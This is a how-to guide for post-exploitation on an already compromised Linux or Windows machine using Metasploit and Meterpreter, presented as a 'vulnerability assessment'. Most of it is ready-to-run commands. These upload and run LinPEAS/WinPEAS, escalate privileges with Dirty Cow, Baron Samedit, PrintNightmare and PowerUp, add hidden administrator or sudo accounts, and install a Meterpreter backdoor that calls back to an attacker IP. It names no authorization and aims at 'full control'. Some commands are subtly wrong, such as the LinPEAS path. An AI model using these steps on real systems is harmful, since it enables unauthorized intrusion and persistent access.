Comprehensive Guide: Vulnerability Assessment on a Compromised Machine Using Metasploit and Meterpreter

This detailed guide outlines the steps to conduct a complete vulnerability assessment on a compromised machine using Metasploit and Meterpreter. It includes additional tools, workflows, and privilege escalation techniques to achieve root or system-level access.

1. Initial Access with Meterpreter

After successfully compromising the target machine and establishing an active Meterpreter session:

Verify the current user:

meterpreter > getuid

If the user is not root (Linux) or Administrator/System (Windows), privilege escalation will be required.

Gather system information:

meterpreter > sysinfo

This command provides details such as the operating system, architecture, and version, essential for identifying vulnerabilities and local exploits.

System Enumeration

Before exploiting, collect as much information as possible to identify vulnerabilities and misconfigurations.

2.1 Using Metasploit Modules

Suggest Local Exploits: Use the local_exploit_suggester module to analyze the system and recommend potential exploits for privilege escalation:

use post/multi/recon/local_exploit_suggester

set SESSION <session_id>

run

The module evaluates kernel versions, patches, and configurations to suggest applicable exploits.

System Information Gathering:

Linux:

use post/linux/gather/enum_system

set SESSION <session_id>

run

Windows:

use post/windows/gather/enum_system

set SESSION <session_id>

run

These modules extract information such as:

User accounts and permissions.

Running services.

Security configurations.

2.2 External Tools (LinPEAS/WinPEAS)

For a more detailed enumeration:

LinPEAS (Linux):

A script that detects insecure configurations, SUID/SGID files, vulnerable services, and kernel versions.

Usage:

Upload the script to the target machine:

meterpreter > upload /path/to/linpeas.sh /tmp/linpeas.sh

Open a shell session:

meterpreter > shell

Make the script executable:

chmod +x /tmp/linpeas.sh

Execute the script:

./tmp/linpeas.sh

WinPEAS (Windows):

A tool that identifies weak registry configurations, vulnerable services, and sensitive files.

Usage:

Upload the tool to the target system:

meterpreter > upload /path/to/winPEAS.exe C:\Temp\winPEAS.exe

Execute it directly:

meterpreter > execute -f C:\Temp\winPEAS.exe

3. Privilege Escalation

After identifying vulnerabilities, use local exploits to escalate privileges to root or SYSTEM.

3.1 Linux

Kernel Exploits:

Example: Dirty Cow (CVE-2016-5195):

use exploit/linux/local/dirty_cow

set SESSION <session_id>

run

For outdated kernels, use exploits like:

use exploit/linux/local/sudo_baron_samedit

set SESSION <session_id>

run

Weak Permissions:

Exploit misconfigured SUID files or other insecure configurations detected by LinPEAS.

3.2 Windows

Exploitation:

Examples of vulnerabilities:

PrintNightmare (Spooler Service):

use exploit/windows/local/printnightmare

set SESSION <session_id>

set RHOSTS <target_ip>

run

JuicyPotato (COM Permissions): Target privilege escalation in COM-based services.

External Tools:

PowerUp: A PowerShell script for privilege escalation:

powershell

powershell -exec bypass -file C:\Temp\PowerUp.ps1

4. Establishing Persistence

After escalating privileges, ensure continuous access:

Create a New User:

Linux:

useradd -m -s /bin/bash new_user

passwd new_user

usermod -aG sudo new_user

Windows:

cmd

net user new_user password /add

net localgroup administrators new_user /add

Install a Backdoor:

meterpreter > run persistence -U -i 5 -p <port> -r <attacker_ip>

Summary

By following this approach:

Gather detailed system information using Metasploit modules, LinPEAS, or WinPEAS.

Identify exploitable vulnerabilities such as outdated kernels, SUID/SGID files, or misconfigurations.

Use local exploits or weak permissions for privilege escalation.

Establish persistence to maintain future access.

This combination of tools and techniques ensures full control over the compromised machine while meeting operational goals effectively.